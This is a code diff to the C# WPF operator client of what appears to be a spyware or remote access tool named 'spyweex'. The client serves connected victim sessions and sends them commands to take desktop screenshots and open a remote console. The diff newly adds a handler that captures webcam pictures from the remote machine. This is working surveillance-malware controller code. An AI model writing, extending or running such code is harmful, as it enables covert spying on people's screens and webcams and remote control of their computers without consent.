@@ -46,7 +46,7 @@ namespace spyweex_client_wpf
         public updateCmdTextBoxDelegate updateCmdTextBox;
 
         DScreenListener dscreenListener;
-        CmdExecListener cmdexecListener;
+        WebCamPicListener wcpListener;
         ConnectionListener connectionListener;
         ConnectionInfoListener connInfoListener;
 
@@ -56,7 +56,7 @@ namespace spyweex_client_wpf
             DataContext = ViewModelSession;
             InitializeComponent();
             dscreenListener = new DScreenListener();
-            cmdexecListener = new CmdExecListener();
+            wcpListener = new WebCamPicListener();
             connectionListener = new ConnectionListener();
             connInfoListener = new ConnectionInfoListener();
 
@@ -66,8 +66,8 @@ namespace spyweex_client_wpf
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
             SessionListView.ItemsSource = ((ViewModel)DataContext).sessions;
-            //for(int i=0; i<50 ; i++)
-            //((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
+            //for (int i = 0; i < 50; i++)
+            //    ((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
 
             //await UpdateIncomingWithDelay();
         }
@@ -85,7 +85,7 @@ namespace spyweex_client_wpf
                 await _wxhtpServiceServer.Stop();
                 _wxhtpServiceServer = null;
             }
-            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 61234);
+            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 61234, ViewModelSession);
             _wxhtpServiceServer.Start();
             connectionListener.Subscribe(connInfoListener, ViewModelSession, _wxhtpServiceServer);
 
@@ -126,11 +126,10 @@ namespace spyweex_client_wpf
             WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
             try
             {
-                wxhtpClient = _wxhtpServiceServer.TryGetLastOrDefaultClient();
                 ct = cts.Token;
                 await wxhtpClient.ExecuteTask(
                     ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_DESKTOP_SCREEN, PARAM_TYPES.number + "1");
-                dscreenListener.Subscribe(ref wxhtpClient);
+                dscreenListener.Subscribe(wxhtpClient);
             }
             catch (ArgumentNullException ex)
             {
@@ -142,9 +141,26 @@ namespace spyweex_client_wpf
             }
         }
 
-        private void btnWebcamScreen_Clicked(object sender, RoutedEventArgs e)
+        private async void btnWebcamScreen_Clicked(object sender, RoutedEventArgs e)
         {
-
+            if (wcpListener.isSubscribed) return;
+            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
+            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+            try
+            {
+                ct = cts.Token;
+                await wxhtpClient.ExecuteTask(
+                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_WEBCAM_SCREEN, PARAM_TYPES.number + "1");
+                wcpListener.Subscribe(wxhtpClient);
+            }
+            catch (ArgumentNullException ex)
+            {
+                Debug.Write(ex.Message);
+            }
+            catch (TaskCanceledException tce)
+            {
+                Debug.Write("Task was canceled " + tce.Message);
+            }
         }
 
         private void btnAddUser_Clicked(object sender, RoutedEventArgs e)
@@ -164,7 +180,8 @@ namespace spyweex_client_wpf
             if (wxhtpClient.isConsoleAttached) return;
             try
             {
-                var consoleWindow = new Console {Owner = this};
+                ct = cts.Token;
+                var consoleWindow = new Console(wxhtpClient, _wxhtpServiceServer, ct) {Owner = this};
                 consoleWindow.Show();
                 wxhtpClient.isConsoleAttached = true;
             }
